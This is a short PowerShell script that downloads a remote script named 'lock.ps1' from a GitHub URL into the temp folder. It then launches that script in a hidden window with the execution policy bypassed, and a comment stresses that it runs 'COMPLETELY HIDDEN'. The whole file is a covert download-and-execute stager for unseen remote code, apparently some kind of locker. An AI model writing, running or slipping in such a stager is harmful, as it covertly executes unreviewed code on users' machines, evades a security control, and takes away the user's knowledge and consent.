# Downloads and runs the lock script COMPLETELY HIDDEN
$url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/script.ps1"
$tempFile = Join-Path $env:TEMP "lock.ps1"

# Download the script
Invoke-WebRequest -Uri $url -OutFile $tempFile

# Run it hidden and exit immediately
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$tempFile`""
